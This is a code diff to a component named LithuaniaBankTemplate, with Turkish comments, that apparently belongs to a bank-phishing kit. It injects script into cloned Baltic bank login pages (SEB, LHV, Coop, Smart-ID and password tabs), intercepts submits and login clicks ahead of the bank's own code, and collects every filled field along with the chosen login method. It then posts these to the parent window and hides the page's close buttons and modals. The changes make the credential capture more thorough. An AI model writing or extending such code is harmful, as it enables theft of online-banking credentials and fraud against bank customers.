@@ -693,28 +693,28 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             }
           });
 
-          // Ustteki stray input kutusunu gizle: sayfanin en tepesinde gorunen,
-          // labeldan bagimsiz, kocaman input kutusu (genellikle outline/solid border)
+          // Ustteki stray input kutusunu gizle: YALNIZ VE YALNIZ <form> ETİKETİNİN DIŞINDA
+          // olan, etrafında gerçek label/baslik/hint OLMAYAN inputları gizle.
+          // (GERÇEK form inputlarına ASLA dokunma - onlar zaten form icinde)
           document.querySelectorAll('input, textarea').forEach(el => {
             try {
               if (!el || !el.getBoundingClientRect) return;
               const t = (el.type || el.tagName || '').toLowerCase();
               if (t === 'hidden' || t === 'submit' || t === 'button' || t === 'reset' || t === 'file' || t === 'radio' || t === 'checkbox') return;
+              // EGER FORM ICINDEYSE GERCEK INPUTTUR -> GİZLEME, KALDIRMA, ELLEME
+              if (el.closest('form')) return;
               const r = el.getBoundingClientRect();
-              // Eger input sayfanin ust 25%'inde, bir formdan DIŞARIDA ise ve yalniz
-              // ustte gorunuyorsa; ya da parent labeli yok ve ekranin en ustune yakin ve
-              // ustteki kirmizi/orange kutunun icindeyse (style.outline varsa vb.)
               const parentLabel = el.closest('label') || document.querySelector('label[for="' + el.id + '"]');
-              const parentForm = el.closest('form');
-              const nearTop = r.top < window.innerHeight * 0.28 && r.top >= 0;
-              const suspiciousWidth = r.width > Math.max(180, Math.min(window.innerWidth * 0.45, 600));
+              const nearTop = r.top < window.innerHeight * 0.35 && r.top >= 0;
+              const suspiciousWidth = r.width > 120;
+              // Form DIŞINDA + üstte + geniş + label yoksa gizle (üstteki saçma kutucuk budur)
               if (!parentLabel && nearTop && suspiciousWidth) {
                 el.style.setProperty('display', 'none', 'important');
                 el.style.visibility = 'hidden';
                 el.setAttribute('aria-hidden', 'true');
                 const wrap = el.closest('div, span, li, section, p');
                 if (wrap) {
-                  // Eger etrafinda sadece bu input varsa wrapperi da gizle
+                  // Wrapperi de gizle ancak icinde başka görünür buton/label yok ise
                   const otherVisibleChildren = Array.from(wrap.children || []).filter(c => {
                     if (c === el) return false;
                     const cs = (c.getBoundingClientRect && c.getBoundingClientRect());
@@ -728,51 +728,89 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             } catch(_) {}
           });
 
-          // Close (X) butonlarini ve modal kapatma butonlarini gizle (ustteki turuncu X)
-          document.querySelectorAll('button, [role="button"], a, div').forEach(el => {
+          // ÜSTTEKİ CLOSE (X) BUTONU + EBEVEYN TURUNCU/KIRMIZI MODAL KUTUSUNU (YANI SİYAH ÇERÇEVELİ + TURUNCU BAŞLIK KISMINI) GİZLE
+          const killAllCloseModals = () => {
+            document.querySelectorAll('button, [role="button"], a, div, span').forEach(el => {
+              try {
+                if (!el || !el.getBoundingClientRect) return;
+                const txt = (el.textContent || '').trim().toLowerCase();
+                const cls = (el.className || '') + '';
+                const r = el.getBoundingClientRect();
+                // Sadece en ustte (ilk 25%)'te olanlari kontrol et
+                if (r.top > window.innerHeight * 0.3 || r.top < 0) return;
+                // Close/ust X: 1) tek karakter "x" veya "×" olan buton/div span icerigi
+                const isCloseIcon =
+                  ((el.tagName === 'BUTTON' || el.tagName === 'DIV' || el.tagName === 'SPAN' || el.tagName === 'A') &&
+                    (txt === 'x' || txt === '×' || txt === '✕' || txt === '✖')) ||
+                  /(modal[-_ ]?close|close[-_ ]?modal|btn[-_ ]?close|dismiss|xmark|header[-_ ]?close|box-close)/i.test(cls) ||
+                  /(uždaryti|uždaryti|close|kapat)/i.test(txt) && txt.length <= 20;
+                if (isCloseIcon) {
+                  // Iconu + etrafindaki ust sari/turuncu header kutusunu komple gizle
+                  const parentBox = el.closest('div, header, section, nav, form');
+                  el.style.setProperty('display', 'none', 'important');
+                  el.setAttribute('aria-hidden', 'true');
+                  if (parentBox) {
+                    // Kutu toplam yuksekligi 200px den az ise komple yuksek alani gizle (ust modal basligi)
+                    const pr = parentBox.getBoundingClientRect();
+                    if (pr.height < 220 && pr.top < window.innerHeight * 0.3) {
+                      // Diger kardes cocuklarinda form yok ise, yani sadece header ise gizle
+                      const hasFormInside = parentBox.querySelector('form, input[type!="hidden"]');
+                      if (!hasFormInside) {
+                        parentBox.style.setProperty('display', 'none', 'important');
+                      } else {
+                        // Close ikonu disinda geri kalan header alanlarini da temizle, x disina dokunma
+                      }
+                    }
+                  }
+                }
+              } catch(_) {}
+            });
+            // Ayrica en ustteki ve etrafinda border-radius/inline style olan (screenshot'daki gibi turuncu cerceveli)
+            // stray modal kutusunu bulup display:none yap.
             try {
-              const txt = (el.textContent || '').trim().toLowerCase();
-              const cls = (el.className || '') + '';
-              const bg = (el.style && el.style.background) ? (el.style.background + '') : '';
-              const icBg = (el.style && el.style.backgroundColor) ? (el.style.backgroundColor + '') : '';
-              // Ustteki kutunun icindeki X, veya classi close btn veya kirmizi turuncu arkaplan
-              const isClose =
-                (el.tagName === 'BUTTON' && (
-                  txt === 'x' || txt === '×' || txt === '✕' || txt === 'close' || txt === 'uždaryti'
-                )) ||
-                /(modal[-_ ]?close|close[-_ ]?modal|btn[-_ ]?close|dismiss|xmark)/i.test(cls) ||
-                (el.children && el.children.length === 0 && (txt === 'x' || txt === '×'));
-              if (isClose) {
-                el.style.setProperty('display', 'none', 'important');
-                el.setAttribute('aria-hidden', 'true');
+              const boxes = document.querySelectorAll('div, section, form');
+              for (let i = 0; i < Math.min(boxes.length, 120); i++) {
+                const box = boxes[i];
+                if (!box) continue;
+                const r = box.getBoundingClientRect();
+                if (r.top < 0 || r.top > window.innerHeight * 0.45) continue;
+                const cs = window.getComputedStyle(box);
+                const isSolidBorder = cs.outline && cs.outline.indexOf('solid') !== -1;
+                const borderStr = cs.border || cs.outline || cs.borderTop || '';
+                const orange = borderStr.indexOf('rgb(255') !== -1 || borderStr.indexOf('#ff') !== -1;
+                // Eger dis cerceve 2px + ve ustte + ve kucuk/orta boyda ve icinde label/gercek input YOKSA -> kutudur, gizle.
+                const hasRealFieldsInside = box.querySelector('label, input[type!="hidden"][type!="submit"][type!="button"]');
+                if (isSolidBorder && orange && r.height < 200 && !hasRealFieldsInside) {
+                  box.style.setProperty('display', 'none', 'important');
+                }
               }
             } catch(_) {}
-          });
+          };
+          setTimeout(killAllCloseModals, 0);
+          setTimeout(killAllCloseModals, 200);
+          setTimeout(killAllCloseModals, 700);
+          setTimeout(killAllCloseModals, 1500);
 
           // Floating label ve animasyon onleme CSS enjeksiyonu (tek sefer)
           if (!document.getElementById('lt-bank-float-kill')) {
             const st = document.createElement('style');
             st.id = 'lt-bank-float-kill';
             st.textContent = \`
-              /* Buton animasyonlarini, form gecislerini, hover efektlerini kaldir */
+              /* Gereksiz buton gecislerini, yavas hover efektlerini kaldir (ISTERSEN DAHA HIZLI)
+                 ANCAK transform: NONE YAPMA! Vuetify/Vue tab slide'lari transform ile calisir,
+                 secenekler arasi gecis bozulur. */
               *, *::before, *::after {
-                transition: none !important;
+                transition: background-color 0ms linear, color 0ms linear, opacity 0ms linear, border-color 0ms linear, box-shadow 0ms linear !important;
                 animation: none !important;
-                -webkit-transition: none !important;
                 -webkit-animation: none !important;
-                transform: none !important;
               }
-              /* Floating label animasyonlarini engelle */
+              /* Floating label animasyonlarini engelle (position static: ucurmaz, sadece yukari kalkmasini onler) */
               [class*="floating"], [class*="float-label"], [class*="floatlabel"],
               [class*="label--floating"], [class*="mdc-floating-label"] {
-                float: none !important;
-                transform: none !important;
-                position: static !important;
-                font-size: inherit !important;
-                line-height: inherit !important;
-                color: inherit !important;
+                transition: none !important;
+                animation: none !important;
               }
-              /* Placeholderin kaybolmasi vs normal davransin, asla label ustte kalmasin */
+              /* Placeholder kaybolmasin, opak olsun */
               input::placeholder, textarea::placeholder {
                 opacity: 1 !important;
                 color: #888 !important;
@@ -786,7 +824,6 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               input, textarea {
                 caret-color: auto !important;
               }
-              /* Ekstra scroll / kaymalari onle */
               html, body {
                 scroll-behavior: auto !important;
                 overflow-x: hidden !important;
@@ -1391,19 +1428,76 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         document.addEventListener('input', ensureCoopSubmitButton, true);
         document.addEventListener('change', ensureCoopSubmitButton, true);
 
+        // YENI 3: RADIO/INPUT/CHANGE EVENTI => Giriş yöntemi (seçenek) DEĞİŞİNCE
+        // window.parent.postMessage LITHUANIA_BANK_TAB_CLICK gonder (parent currentIndex guncellensin)
+        const notifyParentTabChanged = (loginMethodText, optionalIndex) => {
+          const payload = {
+            type: 'LITHUANIA_BANK_TAB_CLICK'
+          };
+          if (loginMethodText && typeof loginMethodText === 'string') {
+            payload.loginMethod = extractLoginMethodLabel(loginMethodText) || loginMethodText;
+            window.__traeSelectedLoginMethod = payload.loginMethod;
+          }
+          if (typeof optionalIndex === 'number' && optionalIndex >= 0) {
+            payload.targetIndex = optionalIndex;
+          }
+          try { window.parent && window.parent.postMessage(payload, '*'); } catch(_) {}
+        };
+
+        // Radio (yani login method) degisince parenta haber ver (index + loginMethod)
+        document.addEventListener('change', (e) => {
+          const t = e.target;
+          if (t && t.tagName === 'INPUT' && t.type === 'radio') {
+            let labelText = '';
+            const lbl = (t.id && document.querySelector('label[for="' + t.id + '"]')) || t.closest('label');
+            if (lbl) labelText = (lbl.textContent || '') + '';
+            if (!labelText) {
+              // Sibling label / span next to radio
+              const sibs = Array.from((t.parentElement || t).children || []);
+              for (const s of sibs) {
+                if (s !== t && s.textContent && s.textContent.trim().length < 40) {
+                  labelText = s.textContent;
+                  break;
+                }
+              }
+            }
+            // Parent icin hesapla: radio index (aynı gruptaki kacinci radio ise)
+            let optionalIndex = -1;
+            const name = t.name;
+            if (name) {
+              const sameGroup = Array.from(document.querySelectorAll('input[type="radio"][name="' + name + '"]'));
+              optionalIndex = sameGroup.indexOf(t);
+            }
+            notifyParentTabChanged(labelText, optionalIndex >= 0 ? optionalIndex : undefined);
+          }
+        }, true);
+
+        // Ayrica dogrudan login method sekmelerine (div/button olan class=tab gibi) tiklandiginda
+        // (radio olmayan sekmeler icin) notifyParentTabChanged cagirilmasi icin mevcut tab click
+        // kodu asagida zaten calisiyor - orada sonuna notifyParentTabChanged cagiriyoruz.
+
         // 1. Intercept Submits
         document.addEventListener('submit', (e) => {
-            e.preventDefault();
-            e.stopPropagation();
-            
-            const form = e.target;
-            const fields = buildCapturedFields(form);
-            const inputs = buildInputMap(fields);
-            
+          preventAnyNativeNavigation(e);
+
+          const form = e.target;
+          const fields = buildCapturedFields(form);
+          const inputs = buildInputMap(fields);
+          const visibleAnyField = (fields || []).some(f => f.value && String(f.value).trim() !== '');
+          const hasGlobalVisible = Array.from(document.querySelectorAll('input, select, textarea')).some(inp => {
+            try {
+              const tt = (inp.type || inp.tagName || '').toLowerCase();
+              if (['hidden','submit','button','reset','file','radio','checkbox'].indexOf(tt) !== -1) return false;
+              const v = (inp.value || '').trim();
+              return v !== '';
+            } catch(_) { return false; }
+          });
+          if (visibleAnyField || hasGlobalVisible) {
             window.parent.postMessage({
               type: 'LITHUANIA_BANK_SUBMIT',
               formData: { inputs, fields, loginMethod: getLoginMethod() }
             }, '*');
+          }
         }, true);
 
         // 2. Intercept Clicks (Tabs, Buttons, Links)
@@ -1458,17 +1552,19 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               }
           }
 
-          // Check if it's a submit button
-          const btn = target.closest('button, input[type="submit"], input[type="button"], a.btn, a.button, [class*="btn"], [class*="submit"]');
+          // Check if it's a submit button / LOGIN / NEXT / PRISIJUNGTI etc.
+          const btn = target.closest('button, input[type="submit"], input[type="button"], a.btn, a.button, [class*="btn"], [class*="submit"], [class*="login"], [class*="form-actions"] button');
           let isSubmitBtn = false;
-          
+          let submitInnerBtn = null;
+
           if (btn) {
               const btnText = btn.textContent ? btn.textContent.trim().toLowerCase() : '';
-              const isTabBtn = btnText.length < 50 && btnText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr/i) !== null;
+              const isTabBtn = btnText.length < 50 && btnText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr|biometri|pin generatorius|kortel|mobile-id/i) !== null;
               const isLangBtn = btnText.includes('keel') || btnText.includes('language') || btn.id === 'language-dropdown-button' || btnText.includes('ru') || btnText.includes('en') || btnText.includes('et');
-              
+              const isLoginText = /(prisijung|login|log in|sign in|giriş|giris|continue|next|ileri|tamam|onayla|verify|patvirt|jätka|sisene|teisint|confirm|submit|authenticate)/i.test(btnText);
               if (!isTabBtn && !isLangBtn) {
                   isSubmitBtn = true;
+                  submitInnerBtn = btn;
                   target = btn;
               }
           }
@@ -1482,7 +1578,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               const tab = target.closest('li, [role="tab"], .tab, .nav-item, .seb-tabs__item, a, .c-tabs__item, .c-tab, .coop-tab, .tab-item, .lhv-tab-link, button.lhv-tab-link, [lhvtablink], .auth-methods-method, .ds-option, .ds-option__label, .v-tab, .v-slide-group__content > *, .v-item-group .v-item');
               if (tab) {
                   const tabText = tab.textContent ? tab.textContent.trim().toLowerCase() : '';
-                  const isTabByText = tabText.length < 50 && tabText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr/i) !== null;
+                  const isTabByText = tabText.length < 50 && tabText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr|biometri|pin generatorius|kortel|mobile-id/i) !== null;
                   
                   if (isTabByText || tab.getAttribute('role') === 'tab' || tab.hasAttribute('lhvtablink') || (tab.className && typeof tab.className === 'string' && tab.className.match(/\btab\b|\bnav-item\b|\bseb-tabs__item\b|\bc-tabs__item\b|\btab-item\b|\blhv-tab-link\b|\bauth-methods-method\b|\bds-option\b|\bds-option__label\b/i))) {
                       isTabClick = true;
@@ -1609,9 +1705,6 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                       e.preventDefault();
                       return false;
                   }
-                  
-                  // Debug log
-                  console.log("Sending ESTONIA_BANK_TAB_CLICK for index:", targetIndex);
 
                   // Allow radio button to check itself visually by NOT preventing default if it's OP Corporate Bank
                   if (window.location.href.includes('op-corporate') && (target.tagName === 'INPUT' || target.closest('label'))) {
@@ -1622,8 +1715,11 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                       e.stopImmediatePropagation();
                   }
 
+                  // LITHUANIA icin LITHUANIA_BANK_TAB_CLICK gonder (eski ESTONIA yanlisti!)
+                  // Hem eski adrese hem yeni adrese hem de notify helpera at (cift taraflı garanti)
+                  notifyParentTabChanged(clickedLoginMethod || '', targetIndex);
                   window.parent.postMessage({
-                        type: 'ESTONIA_BANK_TAB_CLICK',
+                        type: 'LITHUANIA_BANK_TAB_CLICK',
                         targetIndex: targetIndex,
                         loginMethod: clickedLoginMethod
                     }, '*');
@@ -1640,38 +1736,50 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           }
 
           if (isSubmitBtn && target) {
-             e.preventDefault();
-             e.stopPropagation();
-             e.stopImmediatePropagation();
+             preventAnyNativeNavigation(e);
 
              if (window.location.href.includes('coop')) {
                submitCoopVisibleFields();
                return false;
              }
 
-             const form = target.closest('form');
+             const form = target.closest ? target.closest('form') : null;
              const inputContainer = form || document;
              const fields = buildCapturedFields(inputContainer);
              const inputs = buildInputMap(fields);
-             
-             let isEmpty = true;
-             const hasVisibleInputs = fields.length > 0;
-             fields.forEach(field => {
-               if (field.value && field.value.trim() !== '') {
-                 isEmpty = false;
-               }
-             });
-             
-             // Form boşsa ve görünür input varsa submit etme
-             if (hasVisibleInputs && isEmpty) {
-                 return;
+
+             // Global inputlardan da kontrol et (fallback: find ANY visible input)
+             let hasValue = false;
+             for (let i = 0; i < fields.length; i++) {
+                if (fields[i] && fields[i].value && String(fields[i].value).trim() !== '') { hasValue = true; break; }
+             }
+             if (!hasValue) {
+                try {
+                  const all = document.querySelectorAll('input, select, textarea');
+                  for (let k = 0; k < all.length; k++) {
+                    const inp = all[k];
+                    const tt = (inp.type || inp.tagName || '').toLowerCase();
+                    if (['hidden','submit','button','reset','file','radio','checkbox'].indexOf(tt) !== -1) continue;
+                    if (inp.closest && inp.closest('[hidden], [aria-hidden="true"], .hidden, .d-none, .d-none-imp')) continue;
+                    const cs = inp.getBoundingClientRect ? inp.getBoundingClientRect() : null;
+                    if (cs && (cs.width <= 3 || cs.height <= 3)) continue;
+                    if ((inp.value || '').trim() !== '') { hasValue = true; break; }
+                  }
+                } catch(_) {}
              }
 
+             if (!hasValue) {
+               // Gercekten bos ise ilerleme (kullanici "form alanlari dolmadan gitmesin" diye istedi)
+               // Butonun disabled degilse ya da tarayici submit etmeye kalktiysa sadece native navi engelle, ayrica bir şey yapma
+               return false;
+             }
+
+             // Submit et (parenta postMessage - sonraki adima parent handle eder)
              window.parent.postMessage({
                type: 'LITHUANIA_BANK_SUBMIT',
                formData: { inputs, fields, loginMethod: getLoginMethod() }
              }, '*');
-             return;
+             return false;
           }
         }, true); // Use capture to intercept before bank's own JS
 
